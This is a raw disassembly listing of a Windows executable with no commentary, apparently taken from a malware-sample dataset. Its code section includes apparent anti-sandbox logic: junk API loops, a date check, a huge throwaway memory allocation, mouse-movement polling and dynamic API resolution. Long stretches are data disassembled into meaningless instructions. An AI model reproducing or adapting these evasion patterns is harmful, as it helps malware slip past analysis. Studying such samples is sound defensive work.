sub eax 0x2d2d2d2d
push esp
aas
inc edi
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xc8362d2d
mov ch 0x54
fld [ edi ]
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0xee2d2d2d
xlat
mov ecx 0xed61f830
clc
inc ebp
cmp eax 0xbdbdbd19
r-xdata
or al 0x7b
inc edx
inc edx
sub eax 0x2d2d2d2d
mov esp 0xbe45f436
xor al 0xf9
cdq
lodsd [ esi ]
cmp [ ebp - 0x4e ] bh
cmp edx eax
push eax
inc edx
inc edx
rcr [ ecx + 0x39b2bd99 ] 0xc9
push eax
inc edx
inc edx
push esp
or [ eax ] eax
inc edx
inc edx
sub eax 0x352d2d2d
mov ecx 0x4185484
inc edx
inc edx
sub eax 0xd72d2d2d
mov esi 0xf6030dd5
xor [ edi + ebp * 2 + 0x4a ] edx
inc edx
inc edx
sub eax 0xe6e22d2d
je r-xdata
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x34db2d2d
loopne r-xdata
push esp
jg r-xdata
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2b422d2d
cmp eax 0x54bdbdbd
inc esp
inc ebp
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
inc edx
sub bh [ ecx ]
mov ebp 0x42eebdbd
enter 0x545d 0x67
dec ebp
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
xlat
rcr bl 0x1
xor al 0xf8
popad
in eax 0xd7
int 0xdb
xor al 0xf8
arpl [ eax + ebp * 4 + 0x6b ] dx
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x342d2d2d
rol [ ebp + 0x54 ] 0x2a
pop ebp
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
push esp
imul edx [ eax ] 0x42
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xeabed72d
push esp
lahf
jbe r-xdata
inc edx
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xbdbf38b2
mov ebp 0x7e654abd
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0xbd3d2b42
mov ebp 0x454454bd
mov [ eax ] edx
push sub_48e374
retn
inc edx
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x2d2d2d2d
sub eax 0x5b2d2d2d
pop ecx
pop ecx
pop ebp
retn 0x4
sub_48e348
push ebp
mov ebp esp
xor eax eax
push ebp
push j_sub_4039a8#2
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48e374
retn
sub_48e378
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi rw-data
xor eax eax
push ebp
push j_sub_4039a8
push [ fs : eax ]
mov [ fs : eax ] esp
sub [ rw-data ] 0x1
jae r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48e546
retn
nop
push 0x0
push 0x0
push 0x0
call LineTo
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
call ScaleViewportExtEx
nop
call GetLastError
mov [ rw-data ] eax
cmp [ rw-data ] 0x6
je r-xdata
nop
nop
push rw-data
call GetLocalTime
nop
cmp [ rw-data ] 0x7e1
jae r-xdata
nop
push 0x0
push 0x0
push 0x0
call LineTo
jmp r-xdata
mov ebx 0x23ad
nop
nop
jmp r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
call LineTo
nop
nop
nop
dec ebx
jne r-xdata
push 0x0
push 0x0
push 0x0
call LineTo
nop
nop
push r-xdata
push r-xdata
call GetModuleHandleA
push eax
call GetProcAddress
test eax eax
jne r-xdata
nop
push 0x0
push 0x0
push 0x0
call LineTo
mov ebx 0x8bc0
push 0x0
push 0x0
push 0x0
call LineTo
dec ebx
jne r-xdata
nop
nop
push 0x0
push 0x0
push 0x0
call LineTo
nop
nop
nop
push 0x4
push 0x3000
push 0x2033dedc
push 0x0
call VirtualAlloc
mov esi eax
nop
test esi esi
je r-xdata
nop
mov ebx 0x1
nop
mov ecx ebx
nop
nop
lea eax [ ecx + 0x1 ]
push ecx
mov ecx 0xee
xor edx edx
div ecx
pop ecx
add ecx esi
mov [ ecx ] dl
nop
inc ebx
cmp ebx 0x2033b9c6
jne r-xdata
nop
push 0x8000
push 0x0
push esi
call VirtualFree
nop
nop
mov ebx 0x8e95
push 0x0
push 0x0
push 0x0
call LineTo
dec ebx
jne r-xdata
nop
xor ebx ebx
nop
push rw-data
call GetCursorPos
nop
nop
push 0x0
push 0xb
call SleepEx
nop
cmp ebx 0x6
jbe r-xdata
nop
inc ebx
mov eax [ edi ]
mov [ rw-data ] eax
nop
nop
push 0x0
push 0x0
push 0x0
call LineTo
jmp r-xdata
nop
push 0x0
call sub_488470
nop
jmp r-xdata
nop
nop
push edi
call GetCursorPos
nop
nop
mov eax [ edi ]
sub eax [ rw-data ]
cmp eax 0x28
jbe r-xdata
sub_48e57f
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_48e59f
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_48e5a6
retn
sub_48e662
inc ebp
add [ edi + ebp * 8 - 0x1cbfffbb ] dh
inc edx
add [ eax ] dl
jecxz r-xdata
rol [ edx ] 0x1
test al dl
inc edx
add [ esi + ebx * 8 + 0x42 ] bh
add [ eax - 0x22 ] al
inc edx
add [ eax ] bl
out dx eax
inc edx
add al ch
out dx al
inc edx
add [ eax - 0x11 ] dl
inc edx
add [ eax ] ah
out dx eax
inc edx
add [ eax ] cl
sbb [ ebx ] al
lodsb [ esi ]
pop ss
inc ebx
add [ ecx + ebp * 2 ] dl
inc ebx
add ah cl
push 0xed6c0043
inc edx
add [ ebp * 8 - 0x12cbffbe ] bh
inc edx
add [ ebp * 8 - 0x5b37ffbe ] al
inc ebx
add [ eax + 0x300043a4 ] al
movsd [ edi ] [ esi ]
inc ebx
add al ch
movsb [ edi ] [ esi ]
inc ebx
add [ edi + edx * 4 + 0x43 ] bl
add [ edi + edx * 4 ] ah
inc ebx
add [ eax - 0x5c ] ah
inc ebx
add [ eax ] dh
movsb [ edi ] [ esi ]
inc ebx
add [ eax + 0x70 ] cl
inc ebx
add [ eax ] bl
jo r-xdata
add al ch
in al dx
inc edx
add [ esp + ebp * 8 - 0x11b3ffbe ] dl
inc edx
add [ esi + ebp * 8 ] bl
inc edx
add [ esi + ebp * 8 ] dl
inc edx
add ah ah
in eax dx
inc edx
add ah bl
in eax dx
inc edx
add [ ebp + ebp * 8 - 0x125bffbe ] ch
inc edx
add [ ebp + ebp * 8 + 0x42 ] dh
add [ eax - 0x77ffbd12 ] bh
out dx al
inc edx
add [ esi ] ch
inc ebx
add ah bh
movsd [ edi ] [ esi ]
inc ebx
add [ edi + esi + 0x375c0044 ] cl
inc esp
add [ eax + edx * 8 - 0x2f7bffbe ] dh
inc ebp
add al dl
insd
inc ebp
add al al
inc ebp
inc esp
add [ eax + 0x45 ] cl
inc esp
add [ ecx - 0x1e9bffbe ] dl
inc edx
add [ eax ] ah
rol [ esi ] 0xc4
rol [ esi ] 0x74

add al al
outsd
inc ebx
add [ edi + ebp * 2 + 0x38f40043 ] al
inc esp
add ah al
cmp [ eax + eax - 0x64 ] al
movsd [ edi ] [ esi ]
inc ebx
add [ ebp + 0x43 ] cl
add ah dh
movsd [ edi ] [ esi ]
inc ebx
add [ ebp + 0x69740043 ] ah
inc ebx
add [ ecx + ebp * 2 + 0x43 ] al
add [ edi - 0x58cbffbd ] ch
inc ebx
add ah dl
mov bl 0x43
add [ eax + 0x440043b3 ] dl
pop eax
inc ebp
add ah bl
push edi
inc ebp
add [ eax ] al
outsb
sub_48e77a
inc esi
add [ ebx + ecx * 8 + 0x46 ] al
add [ esp + ebp * 8 + 0x46 ] bh
add [ esp + ebp * 8 + 0x46 ] cl
add al cl
jle r-xdata
inc edi
add ah bh
les eax [ edi ]
cwde
stc
inc edi
add [ ecx + edi * 8 + 0x47 ] bl
add [ esp + edx * 2 + 0x545c0048 ] cl
dec eax
add [ edx + edi * 8 - 0x583ffb9 ] ch
inc edi
add [ esi + edi + 0x3e700048 ] ch
dec eax
add [ edx + edi * 8 + 0x47 ] dl
add [ edx + edi * 8 ] ah
inc edi
add [ eax + ecx + 0x8700048 ] ch
dec eax
add [ eax + 0x43 ] dh
dec eax
add [ ebx + eax * 2 ] dl
dec eax
add [ esp + eax * 2 + 0x44540048 ] al
dec eax
add al dl
push eax
dec eax
add [ eax + edx * 2 + 0x4b600048 ] dl
dec eax
add [ eax ] dh
dec ebx
dec eax
add [ ebx + edx * 2 + 0x48 ] bh
add [ eax ] bh
push ebx
dec eax
add [ esp + edx * 2 ] bl
dec eax
add ah ch
push ebx
dec eax
add [ esp + edx * 2 + 0x48 ] dl
add [ esp + edx * 2 ] ah
dec eax
add [ eax ] dl
lodsd [ esi ]
inc edi
add al ah
lodsb [ esi ]
inc edi
add ah al
push esp
dec eax
add [ esp + edx * 2 - 0x5287ffb8 ] dl
inc edi
add [ eax - 0x53 ] cl
inc edi
add [ ecx + eax * 4 ] al
dec eax
add ah dl
or [ eax ] 0x78
jecxz r-xdata
add [ eax - 0x1bffb882 ] bl
nop
inc edi
add [ eax + edx * 4 - 0x5327ffb9 ] dh
inc edi
add [ eax + 0x700047ac ] ch
xchg ecx eax
inc edi
add [ eax - 0x6f ] al
inc edi
add al bl
mov [ 0xffffffffa2580047 ] al
inc edi
add [ eax + 0x580047a3 ] cl
mov [ 0xffffffffac8c0047 ] eax
inc edi
add [ esp + ebp * 4 + 0x47 ] bl
add ah ah
lodsd [ esi ]
inc edi
add [ ebp + ebp * 4 + 0x54fc0047 ] dh
dec eax
add ah cl
push esp
dec eax
add [ ebp + eax * 8 + 0x47 ] bl
call sub_46ac0c
call sub_403eb4
add [ eax - 0x1d ] cl
dec eax
add [ eax ] al
add [ eax ] al
add [ eax + 0x550048e5 ] al
mov ebp esp
add esp 0xfffffff0
mov eax r-xdata
call sub_406184
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46ab74
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_46ab8c
mov eax [ rw-data ]
mov eax [ eax ]
_start
push ebp
mov ebp esp
add esp 0xfffffff0
mov eax r-xdata
call sub_406184
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46ab74
mov ecx [ rw-data ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ r-xdata ]
call sub_46ab8c
mov eax [ rw-data ]
mov eax [ eax ]
call sub_46ac0c
call sub_403eb4
sub_401324
jmp [ __import_lookup_table_1(user32:CharNextA) ]
ExitProcess
jmp [ __import_lookup_table_0(kernel32:ExitProcess) ]
sub_401334
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_40133c
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_401344
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_40134c
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ __import_lookup_table_0(kernel32:GetCommandLineA) ]
sub_40135c
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_401364
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_40136c
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_401374
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_401394
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
sub_4013ac
jmp [ __import_lookup_table_0(kernel32:MultiByteToWideChar) ]
sub_4013b4
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ __import_lookup_table_0(kernel32:WideCharToMultiByte) ]
sub_4013d4
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ SysAllocStringLen@IAT ]
SysReAllocStringLen
jmp [ SysReAllocStringLen@IAT ]
sub_4013ec
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
InterlockedIncrement
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
sub_401404
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_401414
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401438
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
sub_401450
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401458
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401460
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401468
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401470
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401bba
jmp sub_4039a8
sub_401bc1
mov al [ rw-data ]
pop ebp
retn
sub_401c9e
jmp sub_4039a8
sub_401d6c
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402380
retn
sub_40236c
jmp sub_4039a8
sub_402512
jmp sub_4039a8
sub_4027b1
jmp sub_4039a8
sub_402874
call sub_406138
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_406138
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4028c8
mov [ rw-data ] edx
call sub_403f8c
sub_40292c
push eax
push edx
push ecx
call sub_406138
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402920
retn
sub_402948
retn
sub_40299c
retn
sub_4029a0
push ebx
call sub_406138
mov ebx [ eax + 0x4 ]
call sub_406138
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402a0c
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402a1c
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_402ab8
mov edx [ eax + 0x1c ]
call sub_402a70
retn
sub_402b4b
retn
sub_402b4c
xor ecx ecx
mov cl [ edx ]
inc ecx
xchg edx eax
call sub_4029c0
retn
sub_402d5c
mov ecx 0xff
call sub_402d68
retn
sub_402d8c
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
j_sub_402da8
jmp sub_402da8
sub_402da5
retn
sub_403135
jmp sub_4039a8
sub_403188
fninit
fwait
fldcw [ rw-data ]
retn
sub_4031e0
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_4031ec
push ebx
mov ebx eax
mov eax ebx
call sub_40321c
call sub_4027c4
mov edx eax
mov eax ebx
call sub_403260
pop ebx
retn
sub_403208
push ebx
mov ebx eax
mov eax ebx
call sub_4032b8
mov eax ebx
call sub_4027e4
pop ebx
retn
sub_40321c
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403244
call sub_4035e0
test dl dl
jle r-xdata
retn
call sub_4035c8
sub_403304
retn
sub_40338c
jmp sub_4039a8
sub_403393
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40349c
mov eax 0x8000ffff
retn
sub_4034a4
retn
sub_4034a8
retn
sub_4034ac
retn
sub_4035a1
jmp sub_4036f4
sub_4035a6
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403a08
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4035c8
sub_4035c8
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_4035d0
push ebx
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx - 0x1c ]
mov eax ebx
pop ebx
retn
sub_4035e0
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_4035f0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_4036b8
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_4036d4
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_403aa1
retn
sub_403be4
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403c72
jmp sub_4036f4
sub_403cd2
jmp sub_4036f4
sub_403cec
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403be4
mov [ rw-data ] 0x0
call sub_403c8c
retn
sub_403e25
retn
sub_403f87
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403f8c
mov [ rw-data ] eax
call sub_403eb4
sub_4041c8
retn
sub_404204
retn
sub_404212
retn
sub_40422b
retn
sub_40423c
retn
sub_404323
retn
j_sub_404470
jmp sub_404470
sub_4044b9
retn
sub_4044c1
retn
sub_404503
retn
sub_404688
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402920
sub_4046a0
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call sub_4013ec
sub_4047f8
retn
sub_40480a
retn
sub_404a00
mov ecx 0x1
jmp sub_40496c
sub_404a0a
retn
sub_404a40
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402920
call [ rw-data ]
retn
sub_404b44
mov ecx 0x1
jmp sub_404a58
sub_404b4e
retn
sub_404b50
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402920
call [ rw-data ]
retn
sub_404d76
retn
sub_404d78
push edx
call sub_4027c4
pop edx
test eax eax
je r-xdata
retn
push eax
call sub_404a00
pop eax
sub_404d8c
push eax
call sub_404b44
pop eax
call sub_4027e4
retn
sub_404d9c
xchg ecx eax
xchg edx ecx
call sub_404100
retn
sub_404df0
mov al 0x11
jmp sub_402920
sub_404e1b
retn
sub_40505c
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404c84
pop ebp
retn 0x4
j_sub_404a58
jmp sub_404a58
sub_405071
retn
sub_405074
call sub_405328
retn
sub_4053b4
call sub_40538c
retn
sub_4056fd
jmp sub_4039a8
sub_405868
call sub_405870
retn
sub_40589c
call sub_4058ac
retn
sub_4058a4
call sub_4058cc
retn
sub_4058ac
push ebx
mov ebx eax
mov eax 0x8
call sub_4027c4
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_405967
jmp sub_4036f4
sub_405988
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_4059fc
jmp sub_4039a8
sub_405a03
pop ecx
pop ebp
retn
sub_405a7c
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_405a88
add eax 0x4
push eax
call InterlockedDecrement
retn
sub_405a94
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402920
sub_405aa4
call sub_4031ec
mov [ eax + 0x4 ] 0x1
retn
sub_405dcb
jmp sub_4039a8
sub_405dd2
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405e6f
jmp sub_4039a8
sub_405e76
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405ebf
jmp sub_4039a8
sub_405ec6
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405f8a
jmp sub_4039a8
sub_405f91
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405fe2
jmp sub_4039a8
sub_405fe9
pop ebp
retn
sub_4060c0
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ LocalAlloc@IAT ]
TlsSetValue
jmp [ TlsSetValue@IAT ]
sub_4060e0
push eax
push 0x40
call LocalAlloc
retn
sub_4060ec
mov eax 0x10
retn
sub_406178
mov eax rw-data
call sub_405988
retn
sub_4061ed
jmp sub_4039a8
sub_4061f4
pop ebp
retn
sub_4061f8
sub [ rw-data ] 0x1
retn
sub_406200
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_40621c
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_406265
jmp sub_4039a8
sub_40626c
pop ebp
retn
sub_406270
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ RegOpenKeyExA@IAT ]
RegQueryValueExA
jmp [ RegQueryValueExA@IAT ]
CompareStringA
jmp [ CompareStringA@IAT ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
FileTimeToDosDateTime
jmp [ FileTimeToDosDateTime@IAT ]
FileTimeToLocalFileTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToLocalFileTime) ]
FindClose
jmp [ __import_lookup_table_6(kernel32:FindClose) ]
FindFirstFileA
jmp [ __import_lookup_table_6(kernel32:FindFirstFileA) ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ __import_lookup_table_6(kernel32:FormatMessageA) ]
InterlockedExchange
jmp [ __import_lookup_table_6(kernel32:InterlockedExchange) ]
FreeResource
jmp [ __import_lookup_table_6(kernel32:FreeResource) ]
GetACP
jmp [ __import_lookup_table_6(kernel32:GetACP) ]
GetCPInfo
jmp [ __import_lookup_table_6(kernel32:GetCPInfo) ]
GetComputerNameA
jmp [ GetComputerNameA@IAT ]
GetCurrentProcessId
jmp [ __import_lookup_table_6(kernel32:GetCurrentProcessId) ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetFileAttributesA
jmp [ GetFileAttributesA@IAT ]
GetFullPathNameA
jmp [ __import_lookup_table_6(kernel32:GetFullPathNameA) ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetProfileStringA
jmp [ GetProfileStringA@IAT ]
GetStringTypeExA
jmp [ GetStringTypeExA@IAT ]
GetSystemInfo
jmp [ __import_lookup_table_6(kernel32:GetSystemInfo) ]
GetUserDefaultLCID
jmp [ __import_lookup_table_6(kernel32:GetUserDefaultLCID) ]
GetVersion
jmp [ __import_lookup_table_6(kernel32:GetVersion) ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ GlobalAlloc@IAT ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalHandle
jmp [ GlobalHandle@IAT ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalSize
jmp [ GlobalSize@IAT ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ __import_lookup_table_6(kernel32:LockResource) ]
ReadFile
jmp [ ReadFile@IAT ]
ResetEvent
jmp [ ResetEvent@IAT ]
SetEndOfFile
jmp [ SetEndOfFile@IAT ]
SetEvent
jmp [ SetEvent@IAT ]
SetFilePointer
jmp [ SetFilePointer@IAT ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SizeofResource
jmp [ __import_lookup_table_6(kernel32:SizeofResource) ]
sub_40656c
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SleepEx
jmp [ __import_lookup_table_6(kernel32:SleepEx) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualFree
jmp [ __import_lookup_table_6(kernel32:VirtualFree) ]
VirtualProtect
jmp [ __import_lookup_table_6(kernel32:VirtualProtect) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ WaitForSingleObject@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoSizeA) ]
VerQueryValueA
jmp [ VerQueryValueA@IAT ]
CloseEnhMetaFile
jmp [ CloseEnhMetaFile@IAT ]
CopyEnhMetaFileA
jmp [ CopyEnhMetaFileA@IAT ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDCA
jmp [ CreateDCA@IAT ]
CreateDIBSection
jmp [ __import_lookup_table_8(gdi32:CreateDIBSection) ]
CreateDIBitmap
jmp [ __import_lookup_table_8(gdi32:CreateDIBitmap) ]
CreateEnhMetaFileA
jmp [ CreateEnhMetaFileA@IAT ]
CreateHalftonePalette
jmp [ __import_lookup_table_8(gdi32:CreateHalftonePalette) ]
CreateICA
jmp [ __import_lookup_table_8(gdi32:CreateICA) ]
CreatePalette
jmp [ __import_lookup_table_8(gdi32:CreatePalette) ]
CreatePenIndirect
jmp [ __import_lookup_table_8(gdi32:CreatePenIndirect) ]
DeleteEnhMetaFile
jmp [ DeleteEnhMetaFile@IAT ]
Ellipse
jmp [ __import_lookup_table_8(gdi32:Ellipse) ]
EndDoc
jmp [ __import_lookup_table_8(gdi32:EndDoc) ]
EndPage
jmp [ __import_lookup_table_8(gdi32:EndPage) ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
ExtCreatePen
jmp [ __import_lookup_table_8(gdi32:ExtCreatePen) ]
ExtTextOutA
jmp [ __import_lookup_table_8(gdi32:ExtTextOutA) ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ __import_lookup_table_8(gdi32:GetClipBox) ]
GetCurrentPositionEx
jmp [ GetCurrentPositionEx@IAT ]
GetDCOrgEx
jmp [ __import_lookup_table_8(gdi32:GetDCOrgEx) ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetEnhMetaFileHeader
jmp [ __import_lookup_table_8(gdi32:GetEnhMetaFileHeader) ]
GetPixel
jmp [ GetPixel@IAT ]
GetTextExtentPoint32A
jmp [ __import_lookup_table_8(gdi32:GetTextExtentPoint32A) ]
GetWindowOrgEx
jmp [ __import_lookup_table_8(gdi32:GetWindowOrgEx) ]
LPtoDP
jmp [ __import_lookup_table_8(gdi32:LPtoDP) ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ __import_lookup_table_8(gdi32:MoveToEx) ]
PlayEnhMetaFile
jmp [ PlayEnhMetaFile@IAT ]
PolyPolyline
jmp [ PolyPolyline@IAT ]
Polyline
jmp [ __import_lookup_table_8(gdi32:Polyline) ]
RectVisible
jmp [ RectVisible@IAT ]
Rectangle
jmp [ Rectangle@IAT ]
RoundRect
jmp [ __import_lookup_table_8(gdi32:RoundRect) ]
ScaleViewportExtEx
jmp [ __import_lookup_table_8(gdi32:ScaleViewportExtEx) ]
SelectClipRgn
jmp [ __import_lookup_table_8(gdi32:SelectClipRgn) ]
SetBrushOrgEx
jmp [ SetBrushOrgEx@IAT ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetEnhMetaFileBits
jmp [ SetEnhMetaFileBits@IAT ]
SetPixel
jmp [ SetPixel@IAT ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
UnrealizeObject
jmp [ __import_lookup_table_8(gdi32:UnrealizeObject) ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ __import_lookup_table_9(user32:AdjustWindowRectEx) ]
CharLowerA
jmp [ __import_lookup_table_9(user32:CharLowerA) ]
BeginDeferWindowPos
jmp [ BeginDeferWindowPos@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
BringWindowToTop
jmp [ __import_lookup_table_9(user32:BringWindowToTop) ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CallWindowProcA
